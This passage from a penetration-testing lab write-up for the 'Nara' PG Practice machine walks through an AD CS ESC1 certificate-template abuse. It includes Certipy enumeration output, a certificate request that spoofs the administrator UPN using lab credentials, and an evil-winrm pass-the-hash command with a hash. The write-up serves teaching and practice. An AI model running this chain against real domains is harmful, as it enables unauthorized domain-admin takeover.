Got CA configuration for \u0026#39;NARA-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20240816092801_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20240816092801_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20240816092801_Certipy.json\u0026#39; Also this user belongs to the CERTIFICATE SERVICE DCOM ACCESS group while mapping things out with bloodhound. As shown below this is vulnerable to ESC1 exploit, using few blogs i was able to navigate this ; Blog1, Blog2 ❯ \\cat 20240816092801_Certipy.txt Certificate Authorities 0 CA Name : NARA-CA DNS Name : Nara.nara-security.com Certificate Subject : CN=NARA-CA, DC=nara-security, DC=com Certificate Serial Number : 2401E520F70B7DA34C32FABC71D89E1D Certificate Validity Start : 2023-07-30 14:06:05+00:00 Certificate Validity End : 2123-07-30 14:16:04+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : NARA-SECURITY.COM\\Administrators Access Rights ManageCertificates : NARA-SECURITY.COM\\Administrators NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins ManageCa : NARA-SECURITY.COM\\Administrators NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins Enroll : NARA-SECURITY.COM\\Authenticated Users Certificate Templates 0 Template Name : NaraUser Display Name : NaraUser Certificate Authorities : NARA-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : UserInteractionRequired PublishToDs Private Key Flag : ExportableKey Extended Key Usage : Encrypting File System Secure Email Client Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 100 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Domain Users NARA-SECURITY.COM\\Enterprise Admins Object Control Permissions Owner : NARA-SECURITY.COM\\Administrator Full Control Principals : NARA-SECURITY.COM\\Enrollment Write Owner Principals : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins NARA-SECURITY.COM\\Administrator NARA-SECURITY.COM\\Enrollment Write Dacl Principals : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins NARA-SECURITY.COM\\Administrator NARA-SECURITY.COM\\Enrollment Write Property Principals : NARA-SECURITY.COM\\Domain Admins NARA-SECURITY.COM\\Enterprise Admins NARA-SECURITY.COM\\Administrator NARA-SECURITY.COM\\Enrollment [!] Vulnerabilities ESC1 : \u0026#39;NARA-SECURITY.COM\\\\Domain Users\u0026#39; and \u0026#39;NARA-SECURITY.COM\\\\Enrollment\u0026#39; can enroll, enrollee supplies subject and template allows client authentication ESC4 : \u0026#39;NARA-SECURITY.COM\\\\Enrollment\u0026#39; has dangerous permissions However trying to request a certificate file .pfx i keep getting this error, although the goal is to keep trying till it works, but after numerous attempt this didn\u0026rsquo;t work for me. I mean i just made this blog so you can understand how this works. ❯ certipy req -username JODIE.SUMMERS -password hHO_S9gff7ehXw -target nara-security.com -ca NARA-CA -template NaraUser -upn administrator@nara-security.com -dc-ip 192.168.220.30 -debug Certipy v4.8.2 - by Oliver Lyak (ly4k) [+] Trying to resolve \u0026#39;nara-security.com\u0026#39; at \u0026#39;192.168.220.30\u0026#39; [+] Generating RSA key [*] Requesting certificate via RPC [+] Trying to connect to endpoint: ncacn_np:192.168.220.30[\\pipe\\cert] [+] Connected to endpoint: ncacn_np:192.168.220.30[\\pipe\\cert] [-] Got error while trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline. [*] Request ID is 25 Would you like to save the private key? (y/N) [-] Failed to request certificate If you want you can check this video of a friend exploiting the certificate template on a live stream by Ye Zeiya Shein certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.220.30 # Gives administrator hash You can then pass-the-hash using the evil-winrm utility in kali as the user administrator ❯ evil-winrm -i 192.168.220.30 -u administrator -H d35c4ae45bdd10a4e28ff529a2155745 --SNIP-- Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ","permalink":"http://localhost:1313/hacking/nara/","summary":"Running an nmap scan we have :\n# Nmap 7.94SVN scan initiated Wed Aug 14 21:11:54 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 192.168.209.30 Increasing send delay for 192.168.209.30 from 0 to 5 due to 11 out of 21 dropped probes since last increase. Increasing send delay for 192.168.209.30 from 5 to 10 due to 11 out of 26 dropped probes since last increase. Nmap scan report for 192.","title":"Nara || PG Practice"}]